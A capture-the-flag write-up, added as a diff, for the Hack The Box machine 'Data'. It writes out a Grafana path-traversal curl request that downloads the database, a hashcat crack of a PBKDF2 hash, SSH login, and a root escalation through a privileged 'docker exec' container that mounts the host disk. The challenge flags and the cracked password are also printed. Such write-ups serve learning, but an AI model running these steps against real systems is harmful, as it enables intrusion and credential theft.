@@ -1,0 +1,91 @@
+# HTB: Data
+- Date completed: July 24, 2025
+- Difficulty: Easy (Linux)
+- Methodology: Path Traversal -> SQLite Database Download -> Credential Harvesting -> Privilege Escalation via Sudo Privileges.
+
+#RECON
+
+Basic Nmap scan:
+
+kali@kali:~/HTB/CTF/Da7a$ sudo nmap -sS --top-ports 1000 10.129.4.107                               
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+
+- Viewing the website hosted on 3000, showed us a vulnerable version of Grafana. The website is vulnerable to path traversal.
+
+- Knowing Grafana is an sqlite database using the path traversal vulnerability we were able to download the database:
+
+kali@kali:~/HTB/CTF/Da7a$ curl 'http://10.129.4.107:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  584k  100  584k    0     0   902k      0 --:--:-- --:--:-- --:--:--  902k
+
+- Running sqlitebrowser we open the database and find password hash and salt for boris user.
+
+- The hash format is PBKDF2-HMAC-SHA256. We need to convert it to a crackable format. Which I found a python script for.
+
+- After converting the hash, and running the hash through hascat, the password was cracked:
+
+kali@kali:~/HTB/CTF/Da7a$ hashcat -m 10900 -a 0 converted-hash.txt /usr/share/wordlists/rockyou.txt --force                                                                                               
+
+sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
+
+creds - boris : beautiful1
+
+#FOOTHOLD
+
+- With those credentials we SSH into the machine.
+
+kali@kali:~/HTB/CTF/Da7a$ ssh boris@10.129.4.107                                                     
+
+boris@data:~$
+
+- Getting the user.txt file: 
+
+boris@data:~$ cat user.txt
+fe9e224b434d15290e87a4fa9433b5c0
+
+- Running sudo -l we find:
+
+boris@data:~$ sudo -l
+Matching Defaults entries for boris on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User boris may run the following commands on localhost:
+    (root) NOPASSWD: /snap/bin/docker exec *
+
+#PWNED
+
+- Spawn a root shell inside a running container: 
+
+boris@data:~$ sudo docker exec -u root --privileged -it e6ff5b1cbc85 bash
+
+- Running mount showed what was currently mounted in this root container:
+
+bash-5.1# mount
+
+- Seeing that sda1 wasn't apart of that listing we run:
+
+bash-5.1# mount /dev/sda1 /mnt
+
+- Verifying root's existance:
+
+bash-5.1# ls -la /mnt/root/root.txt
+-rw-r-----    1 root     root            33 Jul 24 20:48 /mnt/root/root.txt
+
+- Getting root.txt:
+
+bash-5.1# cat /mnt/root/root.txt
+f3edf22167cfb365386e334fb1c910e4
+
+#FLAGS
+
+user.txt : fe9e224b434d15290e87a4fa9433b5c0
+root.txt : f3edf22167cfb365386e334fb1c910e4
+
+#SUMMARY
+
+This machine involved exploiting a vulnerable instance of Grafana through a directory traversal vulnerability to obtain a SQLite database containing user credentials. After cracking the PBKDF2-SHA256 hash, we obtained access to the system as the boris user. Leveraging Docker sudo privileges, we escalated to root by entering a running container with elevated rights and mounting the host filesystem.
